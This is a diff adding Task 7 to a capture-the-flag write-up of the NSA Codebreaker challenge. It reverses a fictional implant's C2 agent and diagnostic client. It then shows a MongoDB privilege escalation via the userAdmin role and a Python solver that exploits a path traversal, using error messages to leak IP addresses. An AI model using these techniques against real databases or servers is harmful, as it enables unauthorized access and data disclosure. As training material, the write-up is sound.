@@ -378,6 +378,10 @@ Password found: 6597cb1833a77f7100e8bbb876c96ef767e687fb
 ```
 This corresponded with `lowlythyme862`, so that was the final password.
 
+As it turns out, the correct intention was indeed to bruteforce, but instead of base 10 digits, it was hex digits. I just got really lucky that the 3 characters used happened to be all digits.
+
+Additionally, it was possible to use `hashcat` to extract the hash and crack it that way, which would've been much faster.
+
 # Task 5 - Follow the Data Part 1
 **Reverse Engineering, Forensics**
 > Based on the recovered hardware the device seems to to have an LTE modem and SIM card implying it connects to a GSM telecommunications network. It probably exfiltrates data using this network. Now that you can analyze the entire firmware image, determine where the device is sending data.
@@ -419,7 +423,7 @@ Now, the intention of the challenge is to reverse the individual binaries and fi
 But since the category of the task was labeled forensics, I thought it would be interesting to extract from the binaries and see if there were any embedded files that could be helpful.
 
 However, when I extracted from the `dropper` binary, it generated a very interesting file:
-```plaintext
+```console
 $ binwalk -e dropper
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -487,7 +491,7 @@ So if we have some way to track what IPs access the database, we can catch the a
 Thankfully, we do have a way to track this! The [database profiler](https://www.mongodb.com/docs/manual/tutorial/manage-the-database-profiler/) gives us a way to track all the queries that are run on the database.
 
 However, if we try to set the profiler level to 2, we get an error:
-```plaintext
+```js
 snapshot-06ab44e88a24> db.setProfilingLevel(2)
 MongoServerError: not authorized on snapshot-06ab44e88a24 to execute command { profile: 2, lsid: { id: UUID("75123268-0a2c-48b1-951c-197f5e8d0bac") }, $db: "snapshot-06ab44e88a24" }
 ```
@@ -495,7 +499,7 @@ MongoServerError: not authorized on snapshot-06ab44e88a24 to execute command { p
 This means our user isn't authorized to run this command, so we need to find a way to escalate our privileges.
 
 If we list the users in the database, we can see our current `maintenance` user:
-```plaintext
+```js
 snapshot-06ab44e88a24> show users
 [
   {
@@ -517,7 +521,7 @@ Interesting, we have the `userAdmin` role, which means we can create new users w
 
 So all we have to do is make a new user that can actually run `setProfilingLevel` and we're good to go.
 
-```plaintext
+```js
 db.createUser(
   {
     user: "test",
@@ -535,7 +539,7 @@ db.createUser(
 ```
 
 Now we can log in as our new user, set the profiling level to 2, and profit!
-```plaintext
+```js
 snapshot-06ab44e88a24> db.auth('test', 'testing123')
 { ok: 1 }
 
@@ -543,7 +547,7 @@ snapshot-06ab44e88a24> db.setProfilingLevel(2)
 { was: 0, slowms: 1, sampleRate: 1, ok: 1 }
 ```
 After waiting a bit, the other IP will query the database and show up in the profiler:
-```plaintext
+```js
 snapshot-06ab44e88a24> db.system.profile.find()
 ...
 {
@@ -565,5 +569,767 @@ snapshot-06ab44e88a24> db.system.profile.find()
 ```
 The `client` key is the IP we're looking for, so we can submit `100.94.3.187` and move on!
 
-# Task 7
-Coming soon! (I'm still working on this one give me time to sleep please)
+# Task 7 - There is Another
+**Reverse Engineering, Exploitation**
+> Intelligence sources indicate with high probably there is a second device somewhere. We don't know where it is physically, but maybe you can find it's IP address somehow. We expect it is one of the up to 2^20 devices connected to the Blue Horizon Mobile network. Blue Horizon Mobile has explained that their internal network is segmented so all user devices are in the 100.64.0.0/12 IP range.
+> 
+> Figure out how the device communicates with the IP you found in the previous task. It must only do so on-demand otherwise we would have probably discovered it sooner. This will probably require some in depth reverse engineering and some guess work. Use what you learn, plus intuition and vulnerability research and exploitation skills to extract information from the server somehow. Your goal is to determine the IP addresses for any devices that connected to the same server. There should be two addresses, one for the downed device, and another for the second device. Your jumpbox account has been updated to allow you to open TCP tunnels to the server (reconnect to enable the new settings). Remember the jumpbox internal IP is 100.127.0.2
+> 
+> Downloads:
+> 
+> - SSH host key to authenticate the jumpbox (optional, same as before) (jumpbox-ssh_host_ecdsa_key.pub)
+> - SSH private key to authenticate to the jumpbox: user@external-support.bluehorizonmobile.com on TCP port 22 (same as before) (jumpbox.key)
+> Prompt:
+> 
+> - Enter device IP addresses, one per line (don't guess)
+
+Now we're getting to the real tough stuff. This time, we somehow need to find the IP of another device. But where to begin?
+
+## C2 Review
+Let's start with an overview of the entire attack process again.
+
+Recall from Task 4 that we have this script that runs on boot:
+```sh
+#!/bin/sh
+
+mount -t proc none /proc
+mount -t sysfs none /sys
+/sbin/mdev -s
+mount -a
+
+for drv in /drivers/*.ko; do
+  insmod $drv
+done
+
+[ -s /etc/hostname ] && hostname `cat /etc/hostname`
+
+PRIV_IP=10.101.255.254
+
+ifconfig lo 127.0.0.1 netmask 255.0.0.0
+ifconfig lo up
+ifconfig usb0 $PRIV_IP netmask 255.255.0.0
+ifconfig usb0 up
+
+ifconfig usb1 up
+udhcpc -i usb1 -s /etc/udhcpc.script -b &
+
+/sbin/dropbear -p $PRIV_IP:22
+
+/opt/mount_part /dev/sda2 /private /opt/part.enc /agent
+(/agent/start >/dev/null 2>&1) &
+```
+After mounting the encrypted partition, it runs `/agent/start` to start the actual binaries.
+```sh
+#!/bin/sh
+
+DIR=/agent
+PROC=agent
+RESTART_FILE=agent_restart
+
+# start the navigation service
+/bin/nav
+
+mkdir -p /tmp/upload
+dmesg > /tmp/upload/boot_log_`date -Iseconds`
+
+# start agent and restart if it exists
+while [ 1 ]; do
+    if [ ! -e $DIR/$RESTART_FILE ]; then
+        break
+    fi
+    if [ -z "`ps -o comm | egrep ^${PROC}$`" ]; then
+        $DIR/$PROC $DIR/config
+    fi
+    sleep 10
+done
+```
+Of course in this case `/bin/nav` isn't a real service and is just a placeholder, but the important part is that it runs `/agent/agent` with the config file `/agent/config`.
+
+Now this binary is the actual C2 agent, so let's start reversing!
+
+## Reversing the C2 Agent
+I'll be using Binja for most of these reverse engineering portions, but the general idea should be the same for any other decompiler (From what I've heard it's even easier on IDA).
+
+First, before we start reversing, let's look at the config file:
+```properties
+logfile = "/tmp/log.txt"
+
+# levels 0 (trace) - 5 (fatal)
+loglevel = 1
+
+daemonize = true
+
+id_file = "/private/id.txt"
+ssh_priv_key = "/private/id_ed25519"
+priv_key = "/private/ecc_p256_private.bin"
+
+cmd_host = "0.0.0.0"
+cmd_port = 9000
+
+collectors_usb = [ "/dev/ttyUSB0", "/dev/ttyUSB1" ]
+collectors_ipc = [ "/tmp/c1.unix", "/tmp/c2.unix" ]
+collect_enabled = true
+dropper_exe = "/agent/dropper"
+dropper_config = "/tmp/dropper.yaml"
+dropper_dir = "/tmp/upload"
+
+navigate_ipc = "/tmp/nav_service.unix"
+
+key_file = "/agent/hmac_key"
+restart_flag = "/agent/agent_restart"
+```
+Looks like we have a lot going on here. First, we have some sort of logging mechanism, as well as an option to daemonize the process.
+
+Then, we seem to have some private keys as well as the id file we saw earlier.
+
+Next, we seem to have the host and port for the actual C2 communication.
+
+After that are some options for collection and the dropper. From Task 5/6, we can assume this is just for sending files back to the C2 server through mongodb.
+
+We have the nav service ipc as well, but that probably isn't useful for us.
+
+Finally we have a key file as well as a restart flag.
+
+Now, because this config has to be parsed by the binary, we can try looking for related strings in the binary itself. Here is the process using "navigate_ipc" as an example:
+
+![String "navigate_ipc" found at 0049fb68](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-string-search.png)
+![Constant string "navigate_ipc" at 0049fb68](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-string-const.png)
+![Reference to string "navigate_ipc" in sub_400518](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-string-refs.png)
+![Snippet of code in sub_400518](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-string-decomp.png)
+
+This leads us straight into our main function:
+<CollapsableCodeBlock filename="main()">
+```c++
+int64_t sub_400518(int32_t arg1, int64_t* arg2)
+{
+    int64_t var_8 = 0;
+    int32_t var_12a8 = 1;
+    int32_t var_12a4 = 2;
+    char* s;
+    __builtin_memset(&s, 0, 0x18);
+    int64_t s_1;
+    __builtin_memset(&s_1, 0, 0x90);
+    if (arg1 == 2)
+    {
+        char* x0 = arg2[1];
+        if (((((uint32_t)*(uint8_t*)x0) != 0x2d || (((uint32_t)*(uint8_t*)x0) == 0x2d && ((uint32_t)x0[1]) != 0x68)) || ((((uint32_t)*(uint8_t*)x0) == 0x2d && ((uint32_t)x0[1]) == 0x68) && ((uint32_t)x0[2]) != 0)))
+        {
+            void var_1108;
+            sub_4113a0(&var_1108);
+            sub_4113d0(&var_1108, 2);
+            sub_4113d0(&var_1108, 0xf);
+            sub_4113d0(&var_1108, 3);
+            sub_411370(0, &var_1108);
+            int32_t x0_5 = sub_43c030(0xffffffff, &var_1108);
+            void var_1008;
+            if (sub_43cca0(arg2[1], &var_1008, 0x1000) == 0)
+            {
+                sub_4185f0("could not resolve config path", 1, 0x1d, data_4e76b0);
+                sub_4133d0(1);
+                /* no return */
+            }
+            void var_11f0;
+            sub_404370(&var_11f0);
+            if (sub_404114(&var_11f0, &var_1008) != 1)
+            {
+                sub_43cb80(data_4e76b0, 1, "config error: %s\n");
+                sub_43cb80(data_4e76b0, 1, "file: %s\n");
+                sub_43cb80(data_4e76b0, 1, "line: %d\n");
+                sub_4133d0(1);
+                /* no return */
+            }
+            sub_404de4(&var_11f0, "daemonize", &var_12a8);
+            if (var_12a8 != 0)
+            {
+                sub_402d10();
+            }
+            sub_404be4(&var_11f0, "loglevel", &var_12a4);
+            sub_402550(&data_4028c0, &s_1);
+            char* var_1298;
+            int32_t* x22;
+            if (sub_404b80(&var_11f0, "logfile", &var_1298) == 1)
+            {
+                int32_t* x0_58 = sub_418300(var_1298, &data_49faf0);
+                x22 = x0_58;
+                sub_4025e0(x0_58, var_12a4);
+            }
+            else
+            {
+                x22 = nullptr;
+                sub_402564(((uint64_t)var_12a4));
+            }
+            sub_404b80(&var_11f0, "restart_flag", &s);
+            char* s_2 = s;
+            if (s_2 != 0)
+            {
+                int32_t* x0_18 = sub_418300(s_2, &data_49fb08);
+                if (x0_18 != 0)
+                {
+                    sub_417e20(x0_18);
+                }
+            }
+            int64_t* x0_19 = sub_42b010(1, 0xa8);
+            int64_t x0_20 = sub_402980();
+            sub_404b80(&var_11f0, "ssh_priv_key", &x0_19[5]);
+            char* var_1280;
+            sub_404b80(&var_11f0, "id_file", &var_1280);
+            void var_12a0;
+            int64_t* var_1278;
+            if (sub_402f30(var_1280, &var_1278, &var_12a0) != 0)
+            {
+                int64_t* x24_1 = var_1278;
+                sub_42c550(x0_19, x24_1, 4);
+                sub_42a790(x24_1);
+                var_1278 = nullptr;
+            }
+            int32_t var_1088 = x0_5;
+            int64_t* var_1080 = x0_19;
+            int32_t var_100c = 1;
+            void var_1078;
+            sub_404b80(&var_11f0, "cmd_host", &var_1078);
+            int32_t var_129c;
+            sub_404be4(&var_11f0, "cmd_port", &var_129c);
+            int16_t var_1070 = ((int16_t)var_129c);
+            char* var_1290;
+            sub_404b80(&var_11f0, "priv_key", &var_1290);
+            int64_t var_1168;
+            int64_t* var_12b8 = &var_1168;
+            void var_106e;
+            sub_402160(&var_106e, var_1290);
+            sub_404b80(&var_11f0, "key_file", &x0_19[6]);
+            sub_404b80(&var_11f0, "navigate_ipc", &x0_19[0x14]);
+            int64_t* var_1250;
+            sub_4028d4(&var_1250, "collectors_usb", &var_11f0);
+            int64_t* var_1248;
+            sub_4028d4(&var_1248, "collectors_ipc", &var_11f0);
+            int64_t* var_1258 = x0_19;
+            int64_t var_1240 = x0_20;
+            int64_t* var_1238 = var_12b8;
+            int64_t var_1138;
+            int64_t* var_1230 = &var_1138;
+            int64_t* var_1228 = x0_19;
+            void var_1220;
+            sub_404b80(&var_11f0, "dropper_exe", &var_1220);
+            void var_1218;
+            sub_404b80(&var_11f0, "dropper_config", &var_1218);
+            void var_1210;
+            sub_404b80(&var_11f0, "dropper_dir", &var_1210);
+            int64_t* var_11f8 = &var_1138;
+            x0_19[0x12] = 0x100000001;
+            int64_t var_1208 = x0_20;
+            int64_t* var_1200 = var_12b8;
+            sub_404de4(&var_11f0, "collect_enabled", &x0_19[0x13]);
+            void* var_1260;
+            sub_4218e0(&var_1260, nullptr, sub_402b34, &var_1228);
+            void* var_1268;
+            sub_4218e0(&var_1268, nullptr, sub_401794, &var_1258);
+            void* var_1270;
+            sub_4218e0(&var_1270, nullptr, sub_401220, &var_1088);
+            while (x0_19[0x12] == 1)
+            {
+                sub_4226e0(var_1270, nullptr);
+                if (var_100c == 0)
+                {
+                    x0_19[0x12] = 0;
+                    break;
+                }
+                if (x0_19[0x12] == 0)
+                {
+                    break;
+                }
+                sub_434c80(1);
+                sub_4218e0(&var_1270, nullptr, sub_401220, &var_1088);
+            }
+            sub_402640(2, &data_4a80c0[0x30], 0, "waiting for other threads to fin…");
+            sub_4226e0(var_1268, nullptr);
+            sub_4226e0(var_1260, nullptr);
+            if ((*(uint32_t*)((char*)x0_19 + 0x94) == 0 && s != 0))
+            {
+                sub_402640(3, &data_4a80c0[0x30], 0, "removing restart file");
+                sub_439fa0(s);
+            }
+            int64_t* x20_2 = var_1250;
+            int64_t i = *(uint64_t*)x20_2;
+            if (i != 0)
+            {
+                do
+                {
+                    sub_42a790(i);
+                    *(uint64_t*)x20_2 = 0;
+                    x20_2 = &x20_2[1];
+                    i = *(uint64_t*)x20_2;
+                } while (i != 0);
+            }
+            int64_t* x20_3 = var_1248;
+            int64_t i_1 = *(uint64_t*)x20_3;
+            if (i_1 != 0)
+            {
+                do
+                {
+                    sub_42a790(i_1);
+                    *(uint64_t*)x20_3 = 0;
+                    x20_3 = &x20_3[1];
+                    i_1 = *(uint64_t*)x20_3;
+                } while (i_1 != 0);
+            }
+            sub_404280(&var_11f0);
+            if (x22 != 0)
+            {
+                sub_417e20(x22);
+            }
+            sub_42a790(x0_19[7]);
+            sub_42a790(x0_19[8]);
+            sub_42a790(x0_19[9]);
+            sub_42a790(x0_19);
+            sub_402640(2, &data_4a80c0[0x30], 0, "exiting");
+            sub_423610(&s_1);
+            if (var_8 != 0)
+            {
+                sub_43cce0();
+                /* no return */
+            }
+            return 0;
+        }
+    }
+    *(uint64_t*)arg2;
+    sub_43cb80(data_4e76b0, 1, "usage: %s config\n");
+    sub_4133d0(1);
+    /* no return */
+}
+```
+</CollapsableCodeBlock>
+
+Yeah, that's really long...
+
+But there's a few key parts if we break it down. First comes the parsing of the config file, which are all mostly of the form `function(arg1, "config_option", arg2)`, so they stand out quite a bit.
+
+Next is this section, which seems to be spawning 3 threads
+```c++
+void* var_1260;
+sub_4218e0(&var_1260, nullptr, sub_402b34, &var_1228);
+void* var_1268;
+sub_4218e0(&var_1268, nullptr, sub_401794, &var_1258);
+void* var_1270;
+sub_4218e0(&var_1270, nullptr, sub_401220, &var_1088);
+```
+
+Each thread has a log message at the start like so:
+![sub_402640(2, &data_4a80c0[0x30], 0, "starting upload thread");](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-threads-log.png)
+
+So we can rename the above to their respective names:
+```c++
+void* var_1260;
+start_thread(&var_1260, nullptr, upload_thread, &var_1228);
+void* var_1268;
+start_thread(&var_1268, nullptr, collect_thread, &var_1258);
+void* var_1270;
+start_thread(&var_1270, nullptr, cmd_thread, &var_1088);
+```
+
+The upload_thread is the thing that actually sends files back to the C2 server by calling `dropper` so we can ignore that.
+
+Honestly I'm not to sure what `collect_thread` does, but it seems to be related to the `collectors_usb` and `collectors_ipc` options in the config file.
+
+But importantly, the `cmd_thread` is the one that actually handles the C2 communication, so we should take a look at that.
+
+I won't go super in depth right now, but essentially one of the commands that the `cmd_thread` can run is this:
+```c++
+case 1:
+{
+    int64_t var_40_1 = arg4;
+    char const* const var_38 = x30_1;
+    int64_t s_3 = s_2;
+    var_28 = x20_2;
+    int64_t var_8 = 0;
+    var_18 = "/agent/diagclient";
+    var_10 = 0;
+    int32_t x0_10 = fork();
+    if (x0_10 == 0)
+    {
+        sub_435700();
+        if (((uint32_t)arg2[0x80]) == 0)
+        {
+            __builtin_strcpy(&arg2[0x80], "nonroot_user");
+        }
+        set_env("SSH_SERVER_ADDRESS", &arg2[0xc0], 1, &arg2[0x80]);
+        set_env("SSH_SERVER_PORT", &arg2[0x100], 1, &arg2[0x80]);
+        set_env("PRIVATE_KEY_PATH", *(uint64_t*)((char*)arg1 + 0x28), 1, &arg2[0x80]);
+        set_env("SSH_USERNAME", &arg2[0x80], 1, &arg2[0x80]);
+        set_env("EXPECTED_HOST_KEY", &arg2[0x140], 1, &arg2[0x80]);
+        set_env("BALLOON_ID", arg1, 1, &arg2[0x80]);
+        execve(var_18, &var_18); // "/agent/diagclient"
+        sub_4351b0(1);
+        /* no return */
+    }
+}
+```
+Which sets some enviroment variables and then runs `/agent/diagclient`. This is the other point of contact we're looking for, a ssh connection to the IP we found in Task 6.
+
+## Double Checking
+First, before we even look at `diagclient`, let's see if this theory is actually correct.
+
+From the config file, we can infer that the private key used for the ssh connection is `/private/id_ed25519`, and our user should be `nonroot_user`.
+
+We can set up the jumpbox to point to port 22 for ssh like so:
+```sh
+ssh -i jumpbox.key user@external-support.bluehorizonmobile.com -L 27017:100.94.3.187:22 -N
+```
+And then connect with
+```sh
+ssh -i id_ed25519 nonroot_user@localhost -p 27017
+```
+
+If we connect and send an empty line, here's what we get:
+```plaintext
+$ ssh -i id_ed25519 nonroot_user@localhost -p 27017
+PTY allocation request failed on channel 0
+2024/01/12 23:20:19 Diagnostic Server starting...
+2024/01/12 23:20:24 ready
+{diagserver} 2024/01/12 23:20:24.821777 Starting connection timer...
+
+{diagserver} 2024/01/12 23:21:41.439113 malformed HTTP request ""
+Connection to localhost closed.
+```
+
+So it seems that `diagclient` should be sending an HTTP request over this SSH connection.
+
+Alright, now to actually reverse `diagclient`.
+
+## Reversing diagclient
+Thankfully, `diagclient` isn't stripped like `agent` was, but... it's Golang.
+
+Reversing Golang is honestly a pain just because of how big everything gets, so it's a good thing we can reach `main.main` easily.
+
+Here's a basic rundown of `main.main`, since I don't want to go in depth with Go reversing:
+```c++
+err = os.Getenv("SSH_SERVER_ADDRESScollect System…", 0x12, arg1);
+err = os.Getenv("SSH_SERVER_PORTwriting requestne…", 0xf, arg1);
+err = os.Getenv("PRIVATE_KEY_PATH0123456789abcdef…", 0x10, arg1);
+err = os.Getenv("SSH_USERNAMEresponse: %vrun comp…", 0xc, arg1);
+err = os.Getenv("EXPECTED_HOST_KEYrequest bytes: …", 0x11, arg1);
+err = os.Getenv("BALLOON_ID<redacted> for type (B…", 0xa, arg1);
+err = github.com/google/uuid.Parse(x0_16, x1_13, arg1);
+```
+First, it extracts the enviroment variables that were set earlier from `agent`.
+
+Then, it does some double-checking with the private key and expected host key to make sure they match.
+
+Next, it establishes the actual ssh connection
+```c++
+x0_33 = golang.org/x/crypto/ssh.Dial("tcp", 3, x0_32, x1_31, &var_d0, arg1);
+if (x1_32 == 0)
+{
+    ...
+    x0_37 = golang.org/x/crypto/ssh.(*Client).NewSession(x0_33, arg1);
+    ...
+}
+```
+
+Finally, it gathers some information about the device with `diagclient/procinfo.ProcInfo`, encodes it as json, creates a HTTP request with that json, and sends it over the ssh connection.
+```c++
+...
+err = diagclient/procinfo.ProcInfo(arg1);
+...
+err = encoding/json.Marshal(&data_2a71a0, runtime.convT(&data_2a71a0, &s_3, arg1));
+...
+err = net/http.NewRequestWithContext(&go:itab.context.backgroundCtx,context.Context, &internal/godebug.stderr, "POST", 4, "http://localhost/diagnostics", 0x1c, &go:itab.*strings.Reader,io.Reader, x0_62, arg1);
+// POST to http://localhost/diagnostics
+...
+```
+
+After sending it over, it reads the returned HTTP response and parses its body as json as well. This parsing even includes a bit where the `diagclient` process can run other system commands, but that is unused for this challenge.
+
+Alright, well now we know that it's an HTTP request, why not just do it ourselves?
+
+## Find the params
+Here's a quick little script I wrote to send arbitrary json to the server:
+```py
+from pwn import process
+import json
+
+p = process('ssh -i id_ed25519 nonroot_user@localhost -p 27017'.split(), level='error')
+p.recvuntil(b'timer...\n') # wait for server to start
+
+template = '''POST /diagnostics HTTP/1.1
+Content-Length: {length}
+
+{body}'''
+def send_req(body):
+    body = json.dumps(body)
+    p.send(template.format(length=len(body), body=body).encode())
+
+    p.interactive()
+
+send_req({"a": "b"})
+```
+When we run this, we get this response back:
+```go
+{diagserver} 2024/01/13 00:13:28.069954 received StatusUpdate without CommandResponse
+
+
+
+{"id":"00000000-0000-0000-0000-000000000000","cmd_name":"","cmd_args":null}{diagserver} 2024/01/13 00:13:28.069984 json encoded next command: [123 34 105 100 34 58 34 48 48 48 48 48 48 48 48 45 48 48 48 48 45 48 48 48 48 45 48 48 48 48 45 48 48 48 48 48 48 48 48 48 48 48 48 34 44 34 99 109 100 95 110 97 109 101 34 58 34 34 44 34 99 109 100 95 97 114 103 115 34 58 110 117 108 108 125] err: <nil>
+
+{diagserver} 2024/01/13 00:13:28.070003 Content-Length: 75
+{diagserver} 2024/01/13 00:13:28.070007 server to client body: {"id":"00000000-0000-0000-0000-000000000000","cmd_name":"","cmd_args":null}
+```
+
+So it works! But, now what? We need to figure out how to send useful json to the server. 
+
+Back to more Go reversing :/
+
+Since we know this is a Go binary, let's try seeing if we can find any information about the types. I ended up using [GoReSym](https://github.com/mandiant/GoReSym) from Mandiant, which produced a giant json file with a bunch of information about the binary.
+```console
+$ GoReSym_lin -t diagclient > dump.json
+```
+Some searching shows that there exists `main_StatusUpdate` and `main_CommandResponse` structs, which should be the types for the json we're sending:
+```json
+{
+    "VA": 2781600,
+    "Str": "main.StatusUpdate",
+    "CStr": "main_StatusUpdate",
+    "Kind": "Struct",
+    "Reconstructed": "type main.StatusUpdate struct {\n    StatusData main.StatusData\n    CommandResponse *main.CommandResponse\n}",
+    "CReconstructed": "struct main_StatusUpdate {\n    main_StatusData StatusData;\n    _ptr_main_CommandResponse CommandResponse;\n}"
+},
+{
+    "VA": 2781440,
+    "Str": "main.StatusData",
+    "CStr": "main_StatusData",
+    "Kind": "Struct",
+    "Reconstructed": "type main.StatusData struct {\n    BalloonID  uuid.UUID\n    SystemInfo json.RawMessage\n}",
+    "CReconstructed": "struct main_StatusData {\n    uuid_UUID  BalloonID;\n    json_RawMessage SystemInfo;\n}"
+},
+{
+    "VA": 2928832,
+    "Str": "main.CommandResponse",
+    "CStr": "main_CommandResponse",
+    "Kind": "Struct",
+    "Reconstructed": "type main.CommandResponse struct {\n    Id         uuid.UUID\n    Starttime  string\n    Endtime    string\n    Cmd        string\n    Stdout     string\n    Stderr     string\n    Err        string\n}",
+    "CReconstructed": "struct main_CommandResponse {\n    uuid_UUID  Id;\n    string     Starttime;\n    string     Endtime;\n    string     Cmd;\n    string     Stdout;\n    string     Stderr;\n    string     Err;\n}"
+}
+```
+Cleaned up, they should look like this:
+```go
+type StatusUpdate struct {
+    StatusData main.StatusData
+    CommandResponse *main.CommandResponse
+}
+
+type StatusData struct {
+    BalloonID  uuid.UUID
+    SystemInfo json.RawMessage
+}
+
+struct CommandResponse {
+    uuid_UUID  Id;
+    string     Starttime;
+    string     Endtime;
+    string     Cmd;
+    string     Stdout;
+    string     Stderr;
+    string     Err;
+}
+```
+
+Going back to Binja, we can see that the keys for json should be `"status_data"` and `"command_response"` respectively:
+![StatusData json:\"status_data\"](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-json-statusdata.png)
+![CommandResponse json:\"command_response,omitempty\"](/img/writeups/2024/NSA-Codebreaker-23/task-7-binja-json-commandresponse.png)
+
+Let's try submitting some valid, but empty json:
+```py
+from pwn import process
+import json
+
+p = process('ssh -i id_ed25519 nonroot_user@localhost -p 27017'.split(), level='error')
+p.recvuntil(b'timer...\n') # wait for server to start
+
+template = '''POST /diagnostics HTTP/1.1
+Content-Length: {length}
+
+{body}'''
+def send_req(body):
+    body = json.dumps(body)
+    p.send(template.format(length=len(body), body=body).encode())
+
+    p.interactive()
+
+body = {
+    "status_data": {},
+    "command_response": {},
+}
+
+send_req(body)
+```
+This time, we get a different response.
+```
+{diagserver} 2024/01/13 02:51:06.101452 received StatusUpdate with CommandResponse
+{diagserver} 2024/01/13 02:51:06.101459 Invalid length for command_response.starttime: len() = 0 != 25
+
+
+
+
+{diagserver} 2024/01/13 02:51:06.101471 Content-Length: 0
+{diagserver} 2024/01/13 02:51:06.101475 server to client body:
+```
+
+After a bit of trial and error, we find that if `command_response` is included in the json, it must have both a `starttime` and `endtime` field, and they must be 25 characters long.
+```py
+{
+    "status_data": {},
+    "command_response": {
+        "starttime": "A" * 25,
+        "endtime": "B" * 25,
+    }
+}
+```
+
+But now what?
+
+### I love fuzzing wow fuzz omg wow amazing
+At this point I got really stuck, I wasn't sure how to even begin attacking the remote server.
+
+I ended up going down a bunch of rabbit holes, like improper json parsing, HTTP injection, and even possible command injection through the `cmd` field.
+
+But nothing seemed to work.
+
+Eventually, I just started manually fuzzing the json to see if anything interesting would happen (I was really desperate at this point).
+
+As luck would have it, at some very late hour, one particular payload did indeed result in something interesting.
+```py
+body = {
+    "status_data": {},
+    "command_response": {
+        "starttime": "A" * 24 + "\x00",
+        "endtime": "B" * 25,
+    },
+}
+```
+```
+{diagserver} 2024/01/13 02:56:55.722170 received StatusUpdate with CommandResponse
+
+
+
+{diagserver} 2024/01/13 02:56:55.722228 Error storing CommandResponse to /diagnostics/var/logs/commands/by-ip/64/7F/00/02/AAAAAAAAAAAAAAAAAAAAAAAA\x00.json: open /diagnostics/var/logs/commands/by-ip/64/7F/00/02/AAAAAAAAAAAAAAAAAAAAAAAA\x00.json: invalid argument
+
+{diagserver} 2024/01/13 02:56:55.722244 Content-Length: 0
+{diagserver} 2024/01/13 02:56:55.722248 server to client body:
+```
+
+An error on a file path? Interesting...
+
+It seems the `starttime` field gets directly appended to the file path, so we can use this to leak arbitrary file paths. 
+
+But wait... what's that I see just before our input... `by-ip/64/7F/00/02/`?
+
+And what was our jumpbox IP again? `100.127.0.2`. An exact match!
+
+So now our plan is to use the file traversal to go back up through each folder and leak the IP, byte by byte. 
+
+We can get different errors by using a valid path but bad file like so, which tells us if we're on the right track or not:
+```
+{diagserver} 2024/01/13 03:15:53.278825 Error storing CommandResponse to /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../../../../00/./././././.json: open /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../../../../00/./././././.json: no such file or directory
+
+{diagserver} 2024/01/13 03:17:25.273965 Error storing CommandResponse to /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../../../../64/./././././.json: open /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../../../../64/./././././.json: permission denied
+```
+
+Additionally, if we don't get an error at all, we must have reached a completely valid folder, so we can stop there.
+
+In the end, this was the solver I ended up using:
+<CollapsableCodeBlock filename="solve.py">
+```py
+from pwn import process
+import json
+from tqdm import trange
+
+# ssh -i jumpbox.key user@external-support.bluehorizonmobile.com -L 22:100.94.3.187:22 -N
+p = process(
+    'ssh -i id_ed25519 nonroot_user@localhost -p 22'.split(), level='error')
+p.recvuntil(b'timer...\n')  # wait for server to start
+
+template = '''POST /diagnostics HTTP/1.1
+Content-Length: {length}
+
+{body}'''
+
+
+def send_req(body):
+    body = json.dumps(body)
+    p.send(template.format(length=len(body), body=body).encode())
+
+    p.recvline_contains(b'{diagserver}')
+    msg = p.recvline_contains(b'Error storing CommandResponse', timeout=0.3)
+    p.recvline_contains(b'{diagserver}')
+    p.recvline_contains(b'{diagserver}')
+
+    # print(msg)
+    if b"permission denied" in msg or len(msg) == 0:
+        return True  # proper file path
+
+    return False  # bad file path
+
+
+start = "../../../../64/"
+
+
+def search(known, depth=1):
+    if depth == 4:
+        print(known)
+        return [known]
+
+    body = {
+        "status_data": {},
+        "command_response": {
+            "starttime": "A" * 25,
+            "endtime": "A" * 25,
+        }
+    }
+
+    found = []
+    for i in trange(256):
+        guess = known + f"{i:02X}/"
+        while len(guess) < 24:
+            guess += "./"
+
+        if len(guess) == 24:
+            guess += "."
+
+        body["command_response"]["starttime"] = guess
+
+        if send_req(body):
+            found += search(known + f"{i:02X}/", depth+1)
+
+    return found
+
+
+found = search(start)
+
+for ip in found:
+    ip = [int(i, 16) for i in ip.split("/") if i != ".." and i]
+    print(f"found {ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}")
+```
+</CollapsableCodeBlock>
+
+After running and waiting a bit, we get our two IPs!
+```
+100.67.135.8
+100.76.16.177
+```
+
+# Task 8 - Decrypt the Comms
+**Reverse Engineering, Cryptography**
+> The security team at Blue Horizon Mobile was able to capture a packet destined to the device under investigation. It looks to be encrypted, and a quick analysis of the firmware show it uses an HMAC scheme for authentication.
+> 
+> Can you decrypt the packet and recover the secret HMAC key the software uses to verify the contents?
+> 
+> 
+> Downloads:
+> 
+> - Packet capture (capture.pcap)
+> 
+> Prompt:
+> 
+> - Enter the HMAC key string used to authenticate the given packet.
+
+ECDH :)
+
